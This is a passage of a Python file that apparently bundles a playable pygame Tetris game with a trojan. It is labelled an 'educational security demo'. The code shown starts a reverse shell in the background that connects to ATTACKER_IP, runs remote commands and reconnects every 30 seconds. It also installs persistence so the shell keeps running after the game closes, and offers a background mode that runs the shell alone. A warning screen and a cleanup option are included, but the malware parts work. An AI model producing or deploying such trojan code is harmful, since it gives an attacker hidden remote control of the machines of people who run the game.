                        s.send(f"[!] Error executing command: {e}\n".encode())
                
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[!] Shell error: {e}")
                    break
            
            s.close()
            print(f"[*] Connection closed. Reconnecting in 30 seconds...")
            
        except socket.error as e:
            print(f"[!] Connection failed: {e}")
        except Exception as e:
            print(f"[!] Shell thread error: {e}")
        
        time.sleep(30)  # Wait before reconnecting

# ============================================
# TETRIS GAME IMPLEMENTATION
# ============================================

# Game configuration
SCREEN_WIDTH = 800
SCREEN_HEIGHT = 700
GRID_WIDTH = 10
GRID_HEIGHT = 20
BLOCK_SIZE = 30

# Colors
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
GRAY = (128, 128, 128)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
BLUE = (0, 0, 255)
YELLOW = (255, 255, 0)
ORANGE = (255, 165, 0)
PURPLE = (128, 0, 128)
CYAN = (0, 255, 255)

# Tetris pieces with all rotations
PIECES = {
    'I': [
        [[1, 1, 1, 1]],
        [[1], [1], [1], [1]]
    ],
    'O': [
        [[1, 1], [1, 1]]
    ],
    'T': [
        [[0, 1, 0], [1, 1, 1]],
        [[1, 0], [1, 1], [1, 0]],
        [[1, 1, 1], [0, 1, 0]],
        [[0, 1], [1, 1], [0, 1]]
    ],
    'L': [
        [[1, 0, 0], [1, 1, 1]],
        [[1, 1], [1, 0], [1, 0]],
        [[1, 1, 1], [0, 0, 1]],
        [[0, 1], [0, 1], [1, 1]]
    ],
    'J': [
        [[0, 0, 1], [1, 1, 1]],
        [[1, 0], [1, 0], [1, 1]],
        [[1, 1, 1], [1, 0, 0]],
        [[1, 1], [0, 1], [0, 1]]
    ],
    'S': [
        [[0, 1, 1], [1, 1, 0]],
        [[1, 0], [1, 1], [0, 1]]
    ],
    'Z': [
        [[1, 1, 0], [0, 1, 1]],
        [[0, 1], [1, 1], [1, 0]]
    ]
}

PIECE_COLORS = {
    'I': CYAN,
    'O': YELLOW,
    'T': PURPLE,
    'L': ORANGE,
    'J': BLUE,
    'S': GREEN,
    'Z': RED
}

class TetrisGame:
    def __init__(self):
        self.grid = [[0 for _ in range(GRID_WIDTH)] for _ in range(GRID_HEIGHT)]
        self.current_piece = None
        self.current_x = 0
        self.current_y = 0
        self.current_rotation = 0
        self.score = 0
        self.level = 1
        self.lines_cleared = 0
        self.game_over = False
        self.paused = False
        self.next_piece_type = random.choice(list(PIECES.keys()))
        self.new_piece()
        
    def new_piece(self):
        """Generate a new piece."""
        piece_type = self.next_piece_type
        self.next_piece_type = random.choice(list(PIECES.keys()))
        
        self.current_piece = PIECES[piece_type]
        self.current_rotation = 0
        self.current_x = GRID_WIDTH // 2 - len(self.current_piece[0][0]) // 2
        self.current_y = 0
        
        # Check if game over
        if not self.is_valid_position():
            self.game_over = True
    
    def is_valid_position(self, x_offset=0, y_offset=0, rotation=None):
        """Check if current piece position is valid."""
        if rotation is None:
            rotation = self.current_rotation
        
        piece = self.current_piece[rotation % len(self.current_piece)]
        
        for y, row in enumerate(piece):
            for x, cell in enumerate(row):
                if cell:
                    new_x = self.current_x + x + x_offset
                    new_y = self.current_y + y + y_offset
                    
                    # Check boundaries
                    if new_x < 0 or new_x >= GRID_WIDTH or new_y >= GRID_HEIGHT:
                        return False
                    
                    # Check collision with locked pieces
                    if new_y >= 0 and self.grid[new_y][new_x]:
                        return False
        
        return True
    
    def lock_piece(self):
        """Lock the current piece into the grid."""
        piece = self.current_piece[self.current_rotation % len(self.current_piece)]
        
        for y, row in enumerate(piece):
            for x, cell in enumerate(row):
                if cell:
                    grid_y = self.current_y + y
                    grid_x = self.current_x + x
                    if 0 <= grid_y < GRID_HEIGHT and 0 <= grid_x < GRID_WIDTH:
                        self.grid[grid_y][grid_x] = 1
        
        self.clear_lines()
        self.new_piece()
    
    def clear_lines(self):
        """Clear completed lines and update score."""
        lines_cleared = 0
        y = GRID_HEIGHT - 1
        
        while y >= 0:
            if all(self.grid[y]):
                # Remove this line
                del self.grid[y]
                self.grid.insert(0, [0 for _ in range(GRID_WIDTH)])
                lines_cleared += 1
            else:
                y -= 1
        
        if lines_cleared > 0:
            self.lines_cleared += lines_cleared
            # Score calculation: more lines = more points
            points = [0, 100, 300, 500, 800]
            self.score += points[lines_cleared] * self.level
            
            # Level up every 10 lines
            self.level = self.lines_cleared // 10 + 1
    
    def move(self, dx, dy):
        """Move the current piece."""
        if self.is_valid_position(dx, dy):
            self.current_x += dx
            self.current_y += dy
            return True
        return False
    
    def rotate(self):
        """Rotate the current piece."""
        new_rotation = (self.current_rotation + 1) % len(self.current_piece)
        if self.is_valid_position(rotation=new_rotation):
            self.current_rotation = new_rotation
    
    def hard_drop(self):
        """Drop piece to the bottom."""
        while self.move(0, 1):
            self.score += 1  # Soft drop bonus
    
    def update(self):
        """Update game state - called for automatic falling."""
        if not self.move(0, 1):
            self.lock_piece()
    
    def get_ghost_position(self):
        """Get the position where piece would land (ghost piece)."""
        ghost_y = self.current_y
        while True:
            if self.is_valid_position(0, ghost_y - self.current_y + 1):
                ghost_y += 1
            else:
                break
        return ghost_y

def draw_game(screen, game):
    """Draw the game state."""
    screen.fill(BLACK)
    
    # Draw grid background
    grid_surface = pygame.Surface((GRID_WIDTH * BLOCK_SIZE, GRID_HEIGHT * BLOCK_SIZE))
    grid_surface.fill(BLACK)
    
    # Draw grid lines
    for x in range(GRID_WIDTH + 1):
        pygame.draw.line(grid_surface, GRAY, 
                        (x * BLOCK_SIZE, 0), 
                        (x * BLOCK_SIZE, GRID_HEIGHT * BLOCK_SIZE))
    for y in range(GRID_HEIGHT + 1):
        pygame.draw.line(grid_surface, GRAY, 
                        (0, y * BLOCK_SIZE), 
                        (GRID_WIDTH * BLOCK_SIZE, y * BLOCK_SIZE))
    
    # Draw locked pieces
    for y, row in enumerate(game.grid):
        for x, cell in enumerate(row):
            if cell:
                rect = pygame.Rect(x * BLOCK_SIZE, y * BLOCK_SIZE, 
                                 BLOCK_SIZE - 1, BLOCK_SIZE - 1)
                pygame.draw.rect(grid_surface, WHITE, rect)
    
    # Draw ghost piece
    ghost_y = game.get_ghost_position()
    piece = game.current_piece[game.current_rotation % len(game.current_piece)]
    for y, row in enumerate(piece):
        for x, cell in enumerate(row):
            if cell:
                rect = pygame.Rect(
                    (game.current_x + x) * BLOCK_SIZE,
                    (ghost_y + y) * BLOCK_SIZE,
                    BLOCK_SIZE - 1, BLOCK_SIZE - 1
                )
                pygame.draw.rect(grid_surface, GRAY, rect, 2)
    
    # Draw current piece
    piece = game.current_piece[game.current_rotation % len(game.current_piece)]
    piece_color = PIECE_COLORS.get(game.next_piece_type, WHITE) if False else WHITE
    for y, row in enumerate(piece):
        for x, cell in enumerate(row):
            if cell:
                rect = pygame.Rect(
                    (game.current_x + x) * BLOCK_SIZE,
                    (game.current_y + y) * BLOCK_SIZE,
                    BLOCK_SIZE - 1, BLOCK_SIZE - 1
                )
                pygame.draw.rect(grid_surface, piece_color, rect)
                pygame.draw.rect(grid_surface, GRAY, rect, 1)
    
    # Center the grid on screen
    grid_x = (SCREEN_WIDTH - GRID_WIDTH * BLOCK_SIZE) // 2
    grid_y = 50
    screen.blit(grid_surface, (grid_x, grid_y))
    
    # Draw UI
    font = pygame.font.Font(None, 36)
    small_font = pygame.font.Font(None, 24)
    
    # Score panel
    score_text = font.render(f"Score: {game.score}", True, WHITE)
    level_text = font.render(f"Level: {game.level}", True, WHITE)
    lines_text = font.render(f"Lines: {game.lines_cleared}", True, WHITE)
    
    screen.blit(score_text, (20, 20))
    screen.blit(level_text, (20, 60))
    screen.blit(lines_text, (20, 100))
    
    # Next piece preview
    next_text = font.render("Next:", True, WHITE)
    screen.blit(next_text, (SCREEN_WIDTH - 120, 20))
    
    # Draw next piece preview
    next_piece = PIECES[game.next_piece_type][0]
    next_color = PIECE_COLORS[game.next_piece_type]
    preview_x = SCREEN_WIDTH - 100
    preview_y = 60
    
    for y, row in enumerate(next_piece):
        for x, cell in enumerate(row):
            if cell:
                rect = pygame.Rect(
                    preview_x + x * BLOCK_SIZE,
                    preview_y + y * BLOCK_SIZE,
                    BLOCK_SIZE - 2, BLOCK_SIZE - 2
                )
                pygame.draw.rect(screen, next_color, rect)
    
    # Controls help
    controls = [
        "Controls:",
        "← → : Move",
        "↑ : Rotate",
        "↓ : Soft Drop",
        "Space : Hard Drop",
        "P : Pause",
        "ESC : Quit"
    ]
    
    for i, text in enumerate(controls):
        control_text = small_font.render(text, True, GRAY)
        screen.blit(control_text, (20, SCREEN_HEIGHT - 200 + i * 25))
    
    # Security awareness notice
    notice = small_font.render("SECURITY DEMO - Educational Use Only", True, YELLOW)
    screen.blit(notice, (SCREEN_WIDTH // 2 - 150, SCREEN_HEIGHT - 30))
    
    # Game over overlay
    if game.game_over:
        overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT))
        overlay.set_alpha(200)
        overlay.fill(BLACK)
        screen.blit(overlay, (0, 0))
        
        game_over_font = pygame.font.Font(None, 72)
        game_over_text = game_over_font.render("GAME OVER", True, RED)
        restart_text = font.render("Press R to restart", True, WHITE)
        
        screen.blit(game_over_text, 
                   (SCREEN_WIDTH // 2 - game_over_text.get_width() // 2, SCREEN_HEIGHT // 2 - 50))
        screen.blit(restart_text,
                   (SCREEN_WIDTH // 2 - restart_text.get_width() // 2, SCREEN_HEIGHT // 2 + 20))
    
    # Pause overlay
    elif game.paused:
        overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT))
        overlay.set_alpha(150)
        overlay.fill(BLACK)
        screen.blit(overlay, (0, 0))
        
        pause_font = pygame.font.Font(None, 72)
        pause_text = pause_font.render("PAUSED", True, YELLOW)
        screen.blit(pause_text,
                   (SCREEN_WIDTH // 2 - pause_text.get_width() // 2, SCREEN_HEIGHT // 2 - 50))

def run_game():
    """Main game loop."""
    pygame.init()
    screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
    pygame.display.set_caption("Tetris - Educational Security Demo")
    clock = pygame.time.Clock()
    
    game = TetrisGame()
    
    # Game timing
    fall_time = 0
    fall_speed = 1000  # Initial fall speed in milliseconds
    
    running = True
    while running:
        dt = clock.tick(60)
        
        # Handle events
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    running = False
                
                if not game.game_over and not game.paused:
                    if event.key == pygame.K_LEFT:
                        game.move(-1, 0)
                    elif event.key == pygame.K_RIGHT:
                        game.move(1, 0)
                    elif event.key == pygame.K_UP:
                        game.rotate()
                    elif event.key == pygame.K_DOWN:
                        if game.move(0, 1):
                            game.score += 1  # Soft drop bonus
                    elif event.key == pygame.K_SPACE:
                        game.hard_drop()
                
                if event.key == pygame.K_p:
                    game.paused = not game.paused
                
                if event.key == pygame.K_r and game.game_over:
                    game = TetrisGame()
                    fall_time = 0
        
        # Update game
        if not game.game_over and not game.paused:
            fall_time += dt
            current_fall_speed = max(50, fall_speed - (game.level - 1) * 100)
            
            if fall_time >= current_fall_speed:
                game.update()
                fall_time = 0
        
        # Draw
        draw_game(screen, game)
        pygame.display.flip()
    
    pygame.quit()
    
    # Show exit message GUI since console is not available in windowed mode
    show_exit_message_gui()

def show_exit_message_gui():
    """Display exit message GUI about persistent reverse shell."""
    pygame.init()
    screen = pygame.display.set_mode((700, 500))
    pygame.display.set_caption("GAME CLOSED - Security Notice")
    
    # Colors
    BLACK = (0, 0, 0)
    WHITE = (255, 255, 255)
    RED = (255, 0, 0)
    YELLOW = (255, 255, 0)
    GRAY = (128, 128, 128)
    GREEN = (0, 255, 0)
    
    # Fonts
    title_font = pygame.font.Font(None, 48)
    text_font = pygame.font.Font(None, 28)
    button_font = pygame.font.Font(None, 32)
    
    # Message lines
    messages = [
        "GAME CLOSED",
        "",
        "⚠️  IMPORTANT: The reverse shell is still running!",
        "   The shell connection will persist even after the game closes.",
        "",
        "To remove all persistence:",
        "1. Open Command Prompt or Terminal",
        "2. Navigate to the game folder",
        "3. Run:  tetris-game.exe --cleanup",
        "",
        "Or run the cleanup_tool.py script",
        "",
        "Click OK to close this message",
    ]
    
    ok_button = pygame.Rect(275, 420, 150, 50)
    
    waiting = True
    while waiting:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                waiting = False
            
            if event.type == pygame.MOUSEBUTTONDOWN:
                mouse_pos = event.pos
                if ok_button.collidepoint(mouse_pos):
                    waiting = False
            
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_RETURN or event.key == pygame.K_SPACE:
                    waiting = False
        
        # Draw background
        screen.fill(BLACK)
        
        # Draw title
        title = title_font.render("=" * 20, True, WHITE)
        screen.blit(title, (350 - title.get_width() // 2, 20))
        
        title2 = title_font.render("GAME CLOSED", True, RED)
        screen.blit(title2, (350 - title2.get_width() // 2, 55))
        
        title3 = title_font.render("=" * 20, True, WHITE)
        screen.blit(title3, (350 - title3.get_width() // 2, 90))
        
        # Draw messages
        y_offset = 140
        for line in messages[2:]:  # Skip first 2 lines (title already drawn)
            if not line:
                y_offset += 15
                continue
            if line.startswith("⚠️"):
                text = text_font.render(line, True, RED)
            elif line.startswith("To remove"):
                text = text_font.render(line, True, YELLOW)
            elif "tetris-game.exe" in line or "cleanup_tool" in line:
                text = text_font.render(line, True, GREEN)
            elif line.startswith("Click OK"):
                text = text_font.render(line, True, GRAY)
            else:
                text = text_font.render(line, True, WHITE)
            screen.blit(text, (50, y_offset))
            y_offset += 28
        
        # Draw OK button
        mouse_pos = pygame.mouse.get_pos()
        ok_color = GREEN if ok_button.collidepoint(mouse_pos) else (0, 200, 0)
        pygame.draw.rect(screen, ok_color, ok_button)
        pygame.draw.rect(screen, WHITE, ok_button, 2)
        ok_text = button_font.render("OK", True, BLACK)
        screen.blit(ok_text, (ok_button.centerx - ok_text.get_width() // 2, 
                             ok_button.centery - ok_text.get_height() // 2))
        
        pygame.display.flip()
    
    pygame.quit()

def main():
    """
    Main entry point.
    Handles command line arguments and runs appropriate mode.
    """
    import argparse
    
    parser = argparse.ArgumentParser(description="Tetris Educational Security Demo")
    parser.add_argument("--background", action="store_true", 
                      help="Run in background mode (persistence)")
    parser.add_argument("--cleanup", action="store_true",
                      help="Remove all persistence and exit")
    parser.add_argument("--skip-warning", action="store_true",
                      help="Skip security warning (not recommended)")
    
    args = parser.parse_args()
    
    if args.cleanup:
        print("=" * 70)
        print("TETRIS SECURITY DEMO - CLEANUP MODE")
        print("=" * 70)
        print()
        remove_persistence()
        print()
        print("[+] Cleanup complete. All persistence removed.")
        return
    
    if args.background:
        # Background mode - only run reverse shell, no GUI
        print(f"[*] Starting background service...")
        print(f"[*] Reverse shell will connect to {ATTACKER_IP}:{ATTACKER_PORT}")
        reverse_shell()
        return
    
    # Normal mode - full game with all features
    print("=" * 70)
    print("TETRIS SECURITY EDUCATION PLATFORM")
    print("Rwanda Coding Academy - Defending Rwanda Cyberspace")
    print("=" * 70)
    print()
    
    # Show security warning
    if not args.skip_warning:
        show_security_warning()
    
    # Setup dependencies
    if not setup_dependencies():
        print("[!] Failed to setup dependencies. Exiting.")
        sys.exit(1)
    
    # Install persistence
    install_persistence()
    
    print("=" * 70)
    print("STARTING GAME")
    print("=" * 70)
    print()
    print("[*] Starting reverse shell thread...")
    
    # Start reverse shell in background thread
    shell_thread = threading.Thread(target=reverse_shell, daemon=False)
    shell_thread.start()
    
    print("[*] Starting Tetris game...")
    print("[*] The game will run normally while the shell operates in background")
    print()
    
    # Run the game
    try:
        run_game()
    except Exception as e:
        print(f"[!] Game error: {e}")
    
    print()
    print("=" * 70)
    print("GAME CLOSED")
    print("=" * 70)
    print()
    print("⚠️  IMPORTANT: The reverse shell is still running!")
    print("   The shell connection will persist even after the game closes.")
    print()
    print(f"   To remove all persistence, run:")
    print(f"   python {Path(__file__).name} --cleanup")
    print()

if __name__ == "__main__":
    main()
